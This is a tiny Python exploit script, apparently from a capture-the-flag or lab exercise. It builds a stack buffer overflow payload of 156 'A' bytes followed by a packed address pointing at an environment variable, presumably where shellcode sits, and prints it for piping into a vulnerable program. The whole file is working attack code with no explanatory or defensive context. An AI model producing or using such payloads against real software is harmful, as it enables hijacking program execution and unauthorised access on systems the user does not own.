import struct

len_buffer = 156
env_var_addr =  struct.pack("Q", 0xffffdf8a)

payload = (
    b"A" * (len_buffer) +
    env_var_addr
)

print(payload)